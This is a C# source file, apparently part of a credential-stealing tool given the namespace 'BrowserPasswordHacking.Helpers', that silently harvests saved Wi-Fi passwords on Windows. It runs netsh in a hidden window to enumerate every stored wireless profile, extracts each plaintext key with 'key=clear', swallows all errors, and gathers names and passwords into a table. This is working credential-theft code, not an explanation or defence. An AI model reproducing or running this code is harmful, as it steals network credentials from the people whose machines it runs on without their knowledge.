using System.Data;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;

namespace BrowserPasswordHacking.Helpers
{
    public class WifiPasswords
    {
        public DataTable GetWifiPasswords()
        {
            DataTable dtResults = new DataTable();
            dtResults.Columns.Add("WifiName");
            dtResults.Columns.Add("WifiPassword");
            try
            {
                string output = ExecuteCommand("wlan show profile");
                using (StringReader reader = new StringReader(output))
                {
                    string line;
                    while ((line = reader.ReadLine()) != null)
                    {
                        Regex regex1 = new Regex(@"All User Profile * : (?<after>.*)");
                        Match match1 = regex1.Match(line);
                        if (match1.Success)
                        {
                            string WifiName = match1.Groups["after"].Value;
                            string WifiPassword = GetWifiPassword(WifiName);
                            DataRow dataRow = dtResults.NewRow();
                            dataRow["WifiName"] = WifiName;
                            dataRow["WifiPassword"] = WifiPassword;
                            dtResults.Rows.Add(dataRow);
                        }
                    }
                }
            }
            catch { }
            return dtResults;
        }

        private string ExecuteCommand(string inArgument)
        {
            try
            {
                Process processCmd = new Process();
                processCmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                processCmd.StartInfo.FileName = "netsh";
                processCmd.StartInfo.Arguments = inArgument;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.Start();
                string output = processCmd.StandardOutput.ReadToEnd();
                processCmd.WaitForExit();
                return output;
            }
            catch { }
            return string.Empty;
        }

        private string GetWifiPassword(string WifiName)
        {
            try
            {
                string output = ExecuteCommand("wlan show profile name=\"" + WifiName + "\" key=clear");
                using (StringReader reader = new StringReader(output))
                {
                    string line;
                    while ((line = reader.ReadLine()) != null)
                    {
                        Regex regex1 = new Regex(@"Key Content * : (?<after>.*)");
                        Match match1 = regex1.Match(line);
                        if (match1.Success)
                        {
                            string WifiPassword = match1.Groups["after"].Value;
                            return WifiPassword;
                        }
                    }
                }
            }
            catch { }
            return string.Empty;
        }
    }
}